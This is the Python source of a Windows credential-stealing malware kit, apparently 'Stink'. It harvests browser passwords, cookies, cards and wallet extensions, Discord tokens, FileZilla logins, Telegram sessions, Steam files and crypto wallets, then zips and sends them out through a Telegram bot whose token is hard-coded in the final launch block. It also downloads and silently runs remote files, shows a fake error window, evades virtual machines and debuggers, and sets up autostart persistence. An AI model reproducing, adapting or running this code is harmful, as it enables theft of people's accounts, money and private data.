                    print(f"[{self.__browser_name}]: {repr(e)}")

    def _process_profile(self, profile: str) -> None:
        """
        Collects browser profile data.

        Parameters:
        - profile [str]: Browser profile.

        Returns:
        - None.
        """
        profile_name = profile.replace("\\", "/").split("/")[-1]
        functions = [
            {
                "method": self._grab_passwords,
                "arguments": [profile_name, path.join(profile, "Login Data")],
                "status": True if Features.passwords in self.__statuses else False
            },
            {
                "method": self._grab_cookies,
                "arguments": [profile_name, path.join(profile, "Network", "Cookies")],
                "status": True if Features.cookies in self.__statuses else False
            },
            {
                "method": self._grab_cards,
                "arguments": [profile_name, path.join(profile, "Web Data")],
                "status": True if Features.cards in self.__statuses else False
            },
            {
                "method": self._grab_history,
                "arguments": [profile_name, path.join(profile, "History")],
                "status": True if Features.history in self.__statuses else False
            },
            {
                "method": self._grab_bookmarks,
                "arguments": [profile_name, path.join(profile, "Bookmarks")],
                "status": True if Features.bookmarks in self.__statuses else False
            },
            {
                "method": self._grab_extensions,
                "arguments": [profile_name, path.join(profile, "Extensions")],
                "status": True if Features.bookmarks in self.__statuses else False
            },
            {
                "method": self._grab_wallets,
                "arguments": [profile_name, path.join(profile, "Local Extension Settings")],
                "status": True if Features.wallets in self.__statuses else False
            }
        ]

        for function in functions:

            try:

                if function["status"] is False:
                    continue

                function["method"](*function["arguments"])

            except Exception as e:
                print(f"[{self.__browser_name}]: {repr(e)}")

    def _check_profiles(self) -> None:
        """
        Collects data for each browser profile.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not self.__profiles:
            print(f"[{self.__browser_name}]: No profiles found")
            return

        self.__master_key = self._get_key()

        for profile in self.__profiles:
            self._process_profile(profile)

    def run(self) -> Data:
        """
        Launches the browser data collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self._kill_process()
            self._check_paths()
            self._check_profiles()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[{self.__browser_name}]: {repr(e)}")

class Discord:
    """
    Collects tokens from the Discord.
    """
    def __init__(self, folder: str):

        self.__file = path.join(folder, "Tokens.txt")
        self.__config = DiscordConfig()
        self.__storage = MemoryStorage()

    def __get_headers(self, token: str = None, content_type: str = "application/json") -> Dict:
        """
        Composes the headers for the query.

        Parameters:
        - token [str]: Discord token.
        - content_type [str]: Content type.

        Returns:
        - dict: Headers data.
        """
        headers = {
            "Content-Type": content_type,
            "User-Agent": self.__config.UserAgent
        }

        if token is not None:
            headers.update({"Authorization": token})

        return headers

    def __check_token(self, *args: MutableMapping[str, str]) -> None:
        """
        Checks token for validity.

        Parameters:
        - *args [tuple]: Discord token and query headers.

        Returns:
        - None.
        """
        try:
            query = urlopen(Request(method="GET", url="https://discordapp.com/api/v6/users/@me", headers=args[1]))
            self.valid.append((args[0], query))
        except:
            self.invalid.append(args[0])

    def __get_tokens(self) -> None:
        """
        Collects all valid and invalid Discord tokens.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not path.exists(self.__config.TokensPath):
            print(f"[Discord]: No Discord found")
            return

        tokens = []

        self.valid = []
        self.invalid = []

        for file in listdir(self.__config.TokensPath):

            if file[-4:] not in [".log", ".ldb"]:
                continue

            for data in [line.strip() for line in open(path.join(self.__config.TokensPath, file), "r", errors="ignore", encoding="utf-8").readlines()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    [tokens.append(item) for item in findall(regex, data)]

        if not tokens:
            return

        tasks = []

        for token in tokens:
            task = Thread(target=self.__check_token, args=[token, self.__get_headers(token)])
            task.setDaemon(True)
            task.start()
            tasks.append(task)

        for task in tasks:
            task.join()

        temp = []

        for result in self.valid:
            storage = loads(result[1].read().decode("utf-8"))
            data = self.__config.DiscordData

            temp.append(data.format(
                storage["username"] if storage["username"] else "No data",
                storage["email"] if storage["email"] else "No data",
                storage["phone"] if storage["phone"] else "No data",
                storage["bio"] if storage["bio"] else "No data",
                result[0]
            ))

        self.__storage.add_from_memory(
            self.__file,
            "Invalid tokens:\n" + "\n".join(item for item in self.invalid) + "\n\nValid tokens:\n" + "".join(item for item in temp)
        )

        self.__storage.add_data("Discord", True)

    def run(self) -> Data:
        """
        Launches the Discord tokens collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_tokens()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Discord]: {repr(e)}")


class FileZilla:
    """
    Collects hosts from the FileZilla.
    """
    def __init__(self, folder: str):

        self.__file = path.join(folder, "Sites.txt")
        self.__config = FileZillaConfig()
        self.__storage = MemoryStorage()

    def __get_hosts(self) -> None:
        """
        Collects all FileZilla hosts.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not path.exists(self.__config.SitesPath):
            print(f"[FileZilla]: No FileZilla found")
            return

        files = listdir(self.__config.SitesPath)
        data_files = self.__config.DataFiles

        if not any(file in data_files for file in files):
            return

        temp = []

        for file in data_files:
            try:

                root = ElementTree.parse(path.join(self.__config.SitesPath, file)).getroot()
                data = self.__config.FileZillaData

                if not root:
                    continue

                for server in root[0].findall("Server"):

                    site_name = server.find("Name").text if hasattr(server.find("Name"), "text") else ""
                    site_user = server.find("User").text if hasattr(server.find("User"), "text") else ""
                    site_pass = server.find("Pass").text if hasattr(server.find("Pass"), "text") else ""
                    site_host = server.find("Host").text if hasattr(server.find("Host"), "text") else ""
                    site_port = server.find("Port").text if hasattr(server.find("Port"), "text") else ""
                    site_pass = b64decode(site_pass).decode("utf-8")

                    temp.append(data.format(site_name, site_user, site_pass, site_host, site_port))

            except Exception as e:
                print(f"[FileZilla]: {file} - {repr(e)}")

        self.__storage.add_from_memory(
            self.__file,
            "".join(item for item in temp)
        )

        self.__storage.add_data("FileZilla", True)

    def run(self) -> Data:
        """
        Launches the FileZilla hosts collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_hosts()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[FileZilla]: {repr(e)}")




class Processes:
    """
    Collects all running processes.
    """
    def __init__(self, folder: str):

        self.__file = path.join(folder, "Processes.txt")
        self.__storage = MemoryStorage()

    @staticmethod
    def get_processes_list() -> List:

        process_list = []
        process_ids = (DWORD * 4096)()
        bytes_needed = DWORD()
        mb = (1024 * 1024)

        windll.psapi.EnumProcesses(byref(process_ids), sizeof(process_ids), byref(bytes_needed))

        for index in range(int(bytes_needed.value / sizeof(DWORD))):
            process_id = process_ids[index]

            try:

                process_handle = windll.kernel32.OpenProcess(0x0400 | 0x0010, False, process_id)
                memory_info = ProcessMemoryCountersEx()
                memory_info.cb = sizeof(ProcessMemoryCountersEx)

                if windll.psapi.GetProcessMemoryInfo(process_handle, byref(memory_info), sizeof(memory_info)):
                    process_name = create_unicode_buffer(512)
                    windll.psapi.GetModuleFileNameExW(process_handle, 0, process_name, sizeof(process_name))

                    process_list.append([
                        path.basename(process_name.value),
                        f"{memory_info.WorkingSetSize // mb} MB",
                        process_id
                    ])

                windll.kernel32.CloseHandle(process_handle)

            except:
                pass

        return process_list

    def __get_system_processes(self) -> None:
        """
        Collects all running processes.

        Parameters:
        - None.

        Returns:
        - None.
        """
        self.__storage.add_from_memory(
            self.__file,
            "\n".join(line for line in create_table(["Name", "Memory", "PID"], self.get_processes_list()))
        )

    def run(self) -> Data:
        """
        Launches the processes collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_system_processes()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Processes]: {repr(e)}")
class Screenshot:
    """
    Takes a screenshot of the monitors.
    """
    def __init__(self, folder: str):

        self.__folder = folder
        self.__storage = MemoryStorage()

    def __create_screen(self) -> None:
        """
        Takes a screenshot of the monitors.

        Parameters:
        - None.

        Returns:
        - None.
        """
        capture = Screencapture()
        screenshots = capture.create_in_memory()

        for index, monitor in enumerate(screenshots):
            self.__storage.add_from_memory(path.join(self.__folder, f"monitor-{index}.png"), monitor)

    def run(self) -> Data:
        """
        Launches the screenshots collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__create_screen()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Screenshot]: {repr(e)}")

class Steam:
    """
    Collects configs from the Steam.
    """
    def __init__(self, folder: str):

        self.__folder = folder
        self.__storage = MemoryStorage()

    @staticmethod
    def __get_steam_path() -> Optional[str]:
        """
        Gets the Steam installation path from the registry.

        Parameters:
        - None.

        Returns:
        - str|None: Steam installation path if found.
        """
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Valve\Steam")
        except FileNotFoundError:
            key = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Valve\Steam", 0, KEY_READ | KEY_WOW64_32KEY)

        value, _ = QueryValueEx(key, "InstallPath")

        if path.exists(value):
            return value

        return None

    def __get_steam_files(self) -> None:
        """
        Collects configs from the Steam.

        Parameters:
        - None.

        Returns:
        - None.
        """
        steam_path = self.__get_steam_path()

        if not steam_path:
            print(f"[Steam]: No Steam found")
            return

        configs = [file for file in listdir(rf"{steam_path}\config") if file != "avatarcache"]

        for config in configs:
            self.__storage.add_from_disk(path.join(steam_path, "config", config), path.join(self.__folder, config))

        ssfns = sum([findall(r"ssfn.*", file) for file in listdir(steam_path)], [])

        for ssfn in ssfns:
            self.__storage.add_from_disk(path.join(steam_path, ssfn), path.join(self.__folder, ssfn))

        self.__storage.add_data("Steam", True)

    def run(self) -> Data:
        """
        Launches the Steam collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_steam_files()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Steam]: {repr(e)}")

class System:
    """
    Collects all system data.
    """
    def __init__(self, folder: str):

        self.__file = path.join(folder, "Configuration.txt")
        self.__config = SystemConfig()
        self.__storage = MemoryStorage()

    @staticmethod
    def get_video_card() -> str:
        """
        Gets the video card name.

        Parameters:
        - None.

        Returns:
        - str: Video card name.
        """
        try:

            display_device = DisplayDevice()
            display_device.cb = sizeof(DisplayDevice)

            user32 = windll.user32
            result = user32.EnumDisplayDevicesW(None, 0, byref(display_device), 0)

            if not result:
                return "Unknown"

            return display_device.DeviceString.strip()

        except:
            return "Unknown"

    @staticmethod
    def __get_ram() -> str:
        """
        Gets information about RAM.

        Parameters:
        - None.

        Returns:
        - str: RAM data table.
        """
        try:

            memory_status = MemoryStatusEx()
            memory_status.dwLength = sizeof(memory_status)

            kernel32 = windll.kernel32

            kernel32.GlobalMemoryStatusEx(byref(memory_status))

            total = str(round(memory_status.ullTotalPhys / (1024 ** 3), 2))
            used = str(round((memory_status.ullTotalPhys - memory_status.ullAvailPhys) / (1024 ** 3), 2))
            free = str(round(memory_status.ullAvailPhys / (1024 ** 3), 2))

            return "\n".join(line for line in create_table(["Used GB", "Free GB", "Total GB"], [[used, free, total]]))

        except:
            return "Unknown"

    @staticmethod
    def __get_disks_info() -> str:
        """
        Gets information about disks.

        Parameters:
        - None.

        Returns:
        - str: Disks data table.
        """
        try:

            kernel32 = windll.kernel32

            drives = []
            bitmask = kernel32.GetLogicalDrives()

            for letter in ascii_uppercase:
                if bitmask & 1:
                    drives.append(f"{letter}:\\")
                bitmask >>= 1

            result = []

            for drive in drives:

                total_bytes = UlargeInteger()
                free_bytes = UlargeInteger()
                available_bytes = UlargeInteger()
                success = kernel32.GetDiskFreeSpaceExW(c_wchar_p(drive), byref(available_bytes), byref(total_bytes), byref(free_bytes))

                if not success:
                    continue

                total = ((total_bytes.HighPart * (2 ** 32)) + total_bytes.LowPart) / (1024 ** 3)
                free = ((free_bytes.HighPart * (2 ** 32)) + free_bytes.LowPart) / (1024 ** 3)
                used = total - free

                result.append([drive, round(used, 2), round(free, 2), round(total, 2)])

            return "\n".join(line for line in create_table(["Drive", "Used GB", "Free GB", "Total GB"], result))

        except:
            return "Unknown"

    @staticmethod
    def __get_processor_name() -> str:
        """
        Gets the processor name.

        Parameters:
        - None.

        Returns:
        - str: Processor name.
        """
        try:
            return QueryValueEx(OpenKey(HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0"), "ProcessorNameString")[0]
        except:
            return "Unknown"

    def __get_ip(self) -> str:
        """
        Gets the IP address.

        Parameters:
        - None.

        Returns:
        - str: IP address.
        """
        try:
            ip = loads(urlopen(url=self.__config.IPUrl, timeout=3).read().decode("utf-8"))["ip"]
        except:
            ip = "Unknown"

        return ip

    def __get_system_info(self) -> None:
        """
        Collects all system data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        user32 = windll.user32
        data = self.__config.SystemData

        net_info = self.__get_ip()
        machine_type = platform.machine()
        os_info = platform.platform()
        network_name = platform.node()
        cpu_info = self.__get_processor_name()
        gpu_info = self.get_video_card()
        ram_info = self.__get_ram()
        disk_info = self.__get_disks_info()
        monitors_info = f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"

        self.__storage.add_from_memory(
            self.__file,
            data.format(
                self.__config.User,
                net_info,
                machine_type,
                os_info,
                network_name,
                monitors_info,
                cpu_info,
                gpu_info,
                ram_info,
                disk_info
            )
        )

        self.__storage.add_data("User", self.__config.User)
        self.__storage.add_data("IP", net_info)
        self.__storage.add_data("OS", os_info)

    def run(self) -> Data:
        """
        Launches the system data collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_system_info()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[System]: {repr(e)}")


class Telegram:
    """
    Collects sessions from the Telegram.
    """
    def __init__(self, folder: str):

        self.__folder = folder
        self.__config = TelegramConfig()
        self.__storage = MemoryStorage()

    def __get_telegram_path(self) -> Optional[str]:
        """
        Gets the Telegram installation path from the registry.

        Parameters:
        - None.

        Returns:
        - str|None: Telegram installation path if found.
        """
        if path.exists(self.__config.SessionsPath):
            return self.__config.SessionsPath

        try:
            key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")

            for i in range(QueryInfoKey(key)[0]):

                subkey_name = EnumKey(key, i)
                subkey = OpenKey(key, subkey_name)

                try:
                    display_name = QueryValueEx(subkey, "DisplayName")[0]

                    if "Telegram" not in display_name:
                        continue

                    return QueryValueEx(subkey, "InstallLocation")[0]
                except FileNotFoundError:
                    pass
        except Exception as e:
            print(f"[Telegram]: {repr(e)}")

        return None

    def __get_sessions(self) -> None:
        """
        Collects sessions from the Telegram.

        Parameters:
        - None.

        Returns:
        - None.
        """
        telegram_path = self.__get_telegram_path()

        if not telegram_path:
            print(f"[Telegram]: No Telegram found")
            return

        telegram_data = path.join(telegram_path, "tdata")
        sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(telegram_data)], [])

        if not sessions:
            return

        sessions.remove("D877F783D5D3EF8C")

        for session in sessions:
            self.__storage.add_from_disk(
                path.join(telegram_data, session),
                path.join(self.__folder, session)
            )

        maps = sum([findall(r"map.*", file) for file in listdir(path.join(telegram_data, "D877F783D5D3EF8C"))], [])

        for map in maps:
            self.__storage.add_from_disk(
                path.join(telegram_data, "D877F783D5D3EF8C", map),
                path.join(self.__folder, "D877F783D5D3EF8C", map)
            )

        self.__storage.add_from_disk(
            path.join(telegram_data, "key_datas"),
            path.join(self.__folder, "key_datas")
        )

        self.__storage.add_data("Telegram", True)

    def run(self) -> Data:
        """
        Launches the Telegram collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_sessions()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Telegram]: {repr(e)}")

class Wallets:
    """
    Collects configs from the crypto wallets.
    """
    def __init__(self, folder: str):

        self.__folder = folder
        self.__config = WalletsConfig()
        self.__storage = MemoryStorage()

    def __get_wallets_files(self) -> None:
        """
        Collects configs from the crypto wallets.

        Parameters:
        - None.

        Returns:
        - None.
        """
        wallets = self.__config.WalletPaths

        for wallet in wallets:

            if not path.exists(wallet["path"]):
                print(f'[Wallets]: No {wallet["name"]} found')
                continue

            self.__storage.add_from_disk(wallet["path"], path.join(self.__folder, wallet["name"]))
            self.__storage.add_data("Wallets", wallet["name"])

    def run(self) -> Data:
        """
        Launches the crypto wallets collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_wallets_files()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Wallets]: {repr(e)}")


class Grabber:
    """
    Collects the specified files from the specified paths.
    """
    def __init__(self, paths: List[str], file_types: List[str], check_sub_folders: bool = False):

        self.__paths = paths
        self.__file_types = file_types
        self.__check_sub_folders = check_sub_folders

        self.__storage = MemoryStorage()
        self.__folder = "Grabber"

    def __grab_files(self) -> None:
        """
        Collects the specified files from the specified paths.

        Parameters:
        - None.

        Returns:
        - None.
        """
        for item in self.__paths:

            if path.isfile(item):

                if not any(item.endswith(file_type) for file_type in self.__file_types):
                    continue

                self.__storage.add_from_disk(item, path.join(self.__folder, item))
                self.__storage.add_data("Grabber", path.basename(item))

            elif path.isdir(item):

                if self.__check_sub_folders:
                    for folder_name, _, filenames in walk(item):
                        for filename in filenames:

                            if not any(filename.endswith(file_type) for file_type in self.__file_types):
                                continue

                            self.__storage.add_from_disk(path.join(folder_name, filename), path.join(self.__folder, filename))
                            self.__storage.add_data("Grabber", filename)
                else:
                    for filename in listdir(item):

                        if not any(filename.endswith(file_type) for file_type in self.__file_types):
                            continue

                        self.__storage.add_from_disk(path.join(item, filename), path.join(self.__folder, filename))
                        self.__storage.add_data("Grabber", filename)

    def run(self) -> Data:
        """
        Launches the grabber module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__grab_files()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Grabber]: {repr(e)}")
from os import path, remove
from urllib.request import urlretrieve
from subprocess import Popen, CREATE_NEW_CONSOLE, SW_HIDE

class Loader:
    """
    Loads a file from a link.
    """
    def __init__(self, url: str, destination_path: str, open_file: bool = False):

        self.__url = url
        self.__destination_path = destination_path
        self.__open_file = open_file

    def __load_file(self) -> None:
        """
        Downloads the file.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if path.exists(self.__destination_path):
            remove(self.__destination_path)

        urlretrieve(self.__url, self.__destination_path)

    def __open_loaded_file(self) -> None:
        """
        Opens the file.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not self.__open_file:
            return

        Popen(
            self.__destination_path,
            shell=True,
            creationflags=CREATE_NEW_CONSOLE | SW_HIDE
        )

    def run(self) -> None:
        """
        Launches the loader module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__load_file()
            self.__open_loaded_file()

        except Exception as e:
            print(f"[Loader]: {repr(e)}")
from ctypes import windll

class Message:
    """
    Shows a fake error window.
    """
    def __init__(self):

        self.__config = MessageConfig()

    def __create_message_window(self) -> None:
        """
        Creates a fake error window.

        Parameters:
        - None.

        Returns:
        - None.
        """
        windll.user32.MessageBoxW(0, self.__config.MessageDescription, self.__config.MessageTitle, 0x10)

    def run(self) -> None:
        """
        Launches the fake error window module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__create_message_window()

        except Exception as e:
            print(f"[Message]: {repr(e)}")

class Protector:
    """
    Protects the script from virtual machines and debugging.
    """
    def __init__(self, protectors: List[Protectors] = None):

        if protectors is None:
            self.__protectors = [Protectors.disable]
        else:
            self.__protectors = protectors

        self.__config = ProtectorConfig()

    @staticmethod
    def __generate_random_string(length: int = 10) -> str:
        """
        Creates a random string.

        Parameters:
        - length [int]: string length.

        Returns:
        - str: Random string.
        """
        return ''.join(choices(ascii_uppercase + ascii_lowercase + digits, k=length))

    def __check_processes(self) -> bool:
        """
        Checks processes of the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        for process in Processes.get_processes_list():

            if process[0] not in self.__config.Tasks:
                continue

            return True

        return False

    def __check_mac_address(self) -> bool:
        """
        Checks the MAC address of the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        return ':'.join(findall("..", "%012x" % getnode())).lower() in self.__config.MacAddresses

    def __check_computer(self) -> bool:
        """
        Checks the name of the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        return getenv("computername").lower() in self.__config.Computers

    def __check_user(self) -> bool:
        """
        Checks the user of the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        return getuser().lower() in self.__config.Users

    def __check_hosting(self) -> bool:
        """
        Checks if the computer is a server.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        try:
            return urlopen(url=self.__config.IPUrl, timeout=3).read().decode("utf-8").lower().strip() == "true"
        except:
            return False

    def __check_http_simulation(self) -> bool:
        """
        Checks if the user is simulating a fake HTTPS connection.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        try:
            urlopen(url=f"https://stink-{self.__generate_random_string(20)}", timeout=1)
        except:
            return False
        else:
            return True

    def __check_virtual_machine(self) -> bool:
        """
        Checks whether virtual machine files exist on the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        try:

            with OpenKey(HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Disk\Enum", 0, KEY_READ) as reg_key:
                value = QueryValueEx(reg_key, '0')[0]

                if any(item.lower() in value.lower() for item in self.__config.RegistryEnums):
                    return True

        except:
            pass

        reg_keys = [
            r"SYSTEM\CurrentControlSet\Enum\IDE",
            r"System\CurrentControlSet\Enum\SCSI"
        ]

        for key in reg_keys:
            try:

                with OpenKey(HKEY_LOCAL_MACHINE, key, 0, KEY_READ) as reg_key:
                    count = QueryInfoKey(reg_key)[0]

                    for item in range(count):

                        if not any(value.lower() in EnumKey(reg_key, item).lower() for value in self.__config.RegistryEnums):
                            continue

                        return True

            except:
                pass

        if any(item.lower() in System.get_video_card() for item in self.__config.Cards):
            return True

        if any(path.exists(item) for item in self.__config.Dlls):
            return True

        return False

    def run(self) -> None:
        """
        Launches the protector module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not self.__protectors or Protectors.disable in self.__protectors:
            return

        try:

            checks = [
                {
                    "method": self.__check_processes,
                    "status": any(item in self.__protectors for item in [Protectors.processes, Protectors.all])
                },
                {
                    "method": self.__check_mac_address,
                    "status": any(item in self.__protectors for item in [Protectors.mac_address, Protectors.all])
                },
                {
                    "method": self.__check_computer,
                    "status": any(item in self.__protectors for item in [Protectors.computer, Protectors.all])
                },
                {
                    "method": self.__check_user,
                    "status": any(item in self.__protectors for item in [Protectors.user, Protectors.all])
                },
                {
                    "method": self.__check_hosting,
                    "status": any(item in self.__protectors for item in [Protectors.hosting, Protectors.all])
                },
                {
                    "method": self.__check_http_simulation,
                    "status": any(item in self.__protectors for item in [Protectors.http_simulation, Protectors.all])
                },
                {
                    "method": self.__check_virtual_machine,
                    "status": any(item in self.__protectors for item in [Protectors.virtual_machine, Protectors.all])
                }
            ]

            for check in checks:

                if check["status"] is False:
                    continue

                result = check["method"]()

                if result:
                    exit(0)

        except Exception as e:
            print(f"[Protector]: {repr(e)}")



class Stealer(Thread):
    """
    Collects and sends the specified data.
    """

    def __init__(
        self,
        senders: List[Any] = None,
        features: List[Features] = None,
        utils: List[Utils] = None,
        loaders: List[Loader] = None,
        protectors: List[Protectors] = None,
        grabbers: List[Grabber] = None,
        delay: int = 0
    ):
        Thread.__init__(self, name="Stealer")

        if loaders is None:
            loaders = []

        if grabbers is None:
            grabbers = []

        if senders is None:
            senders = []

        if utils is None:
            utils = [Utils.all]

        if features is None:
            features = [Features.all]

        if protectors is None:
            protectors = [Protectors.disable]

        self.__protectors = protectors
        self.__loaders = loaders
        self.__grabbers = grabbers
        self.__senders = senders
        self.__autostart = Utils.autostart in utils or Utils.all in utils
        self.__message = Utils.message in utils or Utils.all in utils
        self.__delay = delay

        self.__config = MultistealerConfig()
        self.__storage = MemoryStorage()

        browser_functions = [module for module in [
            Features.passwords,
            Features.cookies,
            Features.cards,
            Features.history,
            Features.bookmarks,
            Features.extensions,
            Features.wallets
        ] if module in features or Features.all in features]
        browser_statuses = len(browser_functions) > 0

        self.__methods = [
            {
                "object": Chromium,
                "arguments": (
                    Browsers.CHROME.value,
                    self.__config.BrowsersData[Browsers.CHROME]["path"],
                    self.__config.BrowsersData[Browsers.CHROME]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_GX.value,
                    self.__config.BrowsersData[Browsers.OPERA_GX]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_GX]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_DEFAULT.value,
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.EDGE.value,
                    self.__config.BrowsersData[Browsers.EDGE]["path"],
                    self.__config.BrowsersData[Browsers.EDGE]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.BRAVE.value,
                    self.__config.BrowsersData[Browsers.BRAVE]["path"],
                    self.__config.BrowsersData[Browsers.BRAVE]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.VIVALDI.value,
                    self.__config.BrowsersData[Browsers.VIVALDI]["path"],
                    self.__config.BrowsersData[Browsers.VIVALDI]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.YANDEX.value,
                    self.__config.BrowsersData[Browsers.YANDEX]["path"],
                    self.__config.BrowsersData[Browsers.YANDEX]["process"],
                    browser_functions
                ),
                "status": browser_statuses
            },
            {
                "object": System,
                "arguments": (
                    "System",
                ),
                "status": Features.system in features or Features.all in features
            },
            {
                "object": Processes,
                "arguments": (
                    "System",
                ),
                "status": Features.processes in features or Features.all in features
            },
            {
                "object": Screenshot,
                "arguments": (
                    "System",
                ),
                "status": Features.screenshot in features or Features.all in features
            },
            {
                "object": Discord,
                "arguments": (
                    "Programs/Discord",
                ),
                "status": Features.discord in features or Features.all in features
            },
            {
                "object": Telegram,
                "arguments": (
                    "Programs/Telegram",
                ),
                "status": Features.telegram in features or Features.all in features
            },
            {
                "object": FileZilla,
                "arguments": (
                    "Programs/FileZilla",
                ),
                "status": Features.filezilla in features or Features.all in features
            },
            {
                "object": Steam,
                "arguments": (
                    "Programs/Steam",
                ),
                "status": Features.steam in features or Features.all in features
            },
            {
                "object": Wallets,
                "arguments": (
                    "Wallets",
                ),
                "status": Features.wallets in features or Features.all in features
            }
        ]

    def run(self) -> None:
        """
        Launches the Stink.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            sleep(self.__delay)

            if self.__message is True:
                Thread(target=Message().run).start()

            Protector(self.__protectors).run()

            ssl._create_default_https_context = ssl._create_unverified_context

            with Pool(processes=self.__config.PoolSize) as pool:
                results = pool.starmap(run_process, [
                    (method["object"], method["arguments"]) for method in self.__methods if method["status"] is True
                ])
            pool.close()

            if self.__grabbers:

                with Pool(processes=self.__config.PoolSize) as pool:
                    grabber_results = pool.starmap(run_process, [
                        (grabber, None) for grabber in self.__grabbers
                    ])
                pool.close()

                results += grabber_results

            data = self.__storage.create_zip([file for data in results if data for file in data.files])
            preview = self.__storage.create_preview([field for data in results if data for field in data.fields])

            for sender in self.__senders:
                sender.run(self.__config.ZipName, data, preview)

            for loader in self.__loaders:
                loader.run()

            if self.__autostart is True:
                Autostart(argv[0]).run()

        except Exception as e:
            print(f"[Multi stealer]: {repr(e)}")
if __name__ == "__main__":
  Stealer(
    senders = [Senders.telegram("6482133231:AAHBfHJ64CuAzadrX7BucjzwhX8cOu5zMHE",5838856540)]
    ).run()